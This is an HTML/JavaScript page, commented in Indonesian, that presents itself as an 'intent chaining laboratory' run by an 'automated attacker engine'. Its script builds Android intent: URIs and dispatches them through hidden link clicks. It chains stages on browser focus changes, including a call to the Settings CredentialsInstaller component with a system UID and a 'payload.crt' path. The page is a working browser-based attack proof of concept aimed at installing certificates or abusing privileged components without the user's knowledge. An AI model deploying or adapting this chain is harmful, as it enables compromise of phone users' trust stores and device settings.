<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Robust Event-Driven Intent Lab</title>
<style>
    body{font-family:monospace; padding:20px; background:#050508; color:#00ffcc;}
    button{width:100%; padding:18px; margin-top:15px; background:#0a1515; color:#00ffcc; border:1px solid #00ffcc; font-weight:bold; cursor:pointer; font-size:14px; text-transform:uppercase;}
    button:hover{background:#00ffcc; color:#000; box-shadow: 0 0 15px #00ffcc;}
    .status-panel{border:1px solid #00ffcc; padding:15px; margin-bottom:15px; background:#020b0b;}
    #console-log{margin-top:20px; border:1px solid #00ffcc; padding:12px; height:380px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px; color:#00ff66;}
    .role-tag{font-weight:bold; padding:2px 6px; border-radius:3px; font-size:10px;}
    .attacker{background:#ff3333; color:#000;}
    .victim{background:#00ffcc; color:#000;}
</style>
</head>
<body>

<h2>Robust Intent Chaining Laboratory</h2>

<div class="status-panel">
    <p>Pipeline State: <span id="harness-state" style="font-weight:bold; color:#ff3333;">STANDBY</span></p>
    <p>Control Mode: <span class="role-tag attacker">AUTOMATED ATTACKER ENGINE</span></p>
    <button id="launch-robust-chain">Execute High-Speed Robust Chain</button>
</div>

<div id="console-log"></div>

<script>
const consoleLog = document.getElementById("console-log");
const stateLabel = document.getElementById("harness-state");

// Peta tahapan eksekusi (State Machine)
let currentStage = 0;
let attackActive = false;

function writeLog(sender, text) {
    const timestamp = new Date().toLocaleTimeString();
    const tag = sender === 'ATTACKER' ? '[ATTACKER]' : '[VICTIM_NODE]';
    consoleLog.textContent += `[${timestamp}] ${tag} ${text}\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

function buildAdvancedUri(action, component = '', extras = {}, flags = '0x14010000') {
    let uri = `intent:#Intent;action=${action};`;
    if (component) uri += `component=${component};`;
    
    Object.keys(extras).forEach(key => {
        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
    });
    
    // Menggabungkan FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_NO_ANIMATION
    uri += `launchFlags=${flags};category=android.intent.category.DEFAULT;end`;
    return uri;
}

function dispatchImmediate(uri) {
    try {
        const anchor = document.createElement("a");
        anchor.href = uri;
        anchor.rel = "noopener noreferrer";
        document.body.appendChild(anchor);
        anchor.click();
        anchor.remove();
        writeLog('ATTACKER', `Payload dispatched to system routing mechanism.`);
    } catch (e) {
        writeLog('VICTIM', `Dispatch failure: ${e.message}`);
    }
}

// Manajemen Rantai Berbasis Peristiwa (Lifecycle-Driven Execution)
function executeNextStage() {
    if (!attackActive) return;

    currentStage++;
    
    if (currentStage === 1) {
        writeLog('ATTACKER', "Memicu Tahap 1: Pengondisian State Nirkabel (Bluetooth Settings)...");
        const stage1 = buildAdvancedUri("android.settings.BLUETOOTH_SETTINGS");
        dispatchImmediate(stage1);
        
    } else if (currentStage === 2) {
        writeLog('ATTACKER', "Siklus Fokus Terdeteksi. Memicu Tahap 2: Simulasi Parameter Redirection...");
        
        // Menguji komponen internal yang menangani kredensial / instalasi sertifikat
        const stage2 = buildAdvancedUri(
            "android.intent.action.VIEW",
            "com.android.settings/.crypto.CredentialsInstaller",
            {
                "install_as_uid": "1000",
                "sys_vulnerable_path": "/sdcard/download/payload.crt"
            },
            "0x10000000"
        );
        dispatchImmediate(stage2);
        
    } else if (currentStage === 3) {
        writeLog('ATTACKER', "Siklus Fokus Terdeteksi. Memicu Tahap 3: Pembersihan Tumpukan Jendela (Reset State)...");
        const stage3 = buildAdvancedUri("android.settings.SETTINGS", "", {}, "0x14000000");
        dispatchImmediate(stage3);
        
        // Mengakhiri rantai serangan setelah semua tahapan terpenuhi
        writeLog('ATTACKER', "Rantai penuh selesai dieksekusi secara otonom.");
        stateLabel.textContent = "COMPLETED";
        attackActive = false;
    }
}

document.getElementById("launch-robust-chain").addEventListener("click", () => {
    if (attackActive) return;
    
    attackActive = true;
    currentStage = 0;
    stateLabel.textContent = "PROCESSING CHAIN";
    writeLog('ATTACKER', "Inisialisasi mesin rantai otonom tingkat tinggi...");
    
    // Memulai tahap pertama secara langsung
    executeNextStage();
});

// Memanfaatkan perubahan visibilitas halaman untuk memicu tahap berikutnya tanpa penundaan waktu statis
document.addEventListener("visibilitychange", () => {
    if (!attackActive) return;

    if (document.hidden) {
        writeLog('VICTIM', "Telemetri: Fokus peramban hilang. Subsistem OS mengambil alih layar.");
    } else {
        writeLog('VICTIM', "Telemetri: Peramban kembali mendapatkan fokus. Memproses antrean berikutnya.");
        // Jalankan tahap berikutnya segera setelah peramban kembali ke latar depan
        executeNextStage();
    }
});

writeLog('ATTACKER', "Mesin pengujian otonom berbasis siklus hidup siap.");
</script>
</body>
</html>
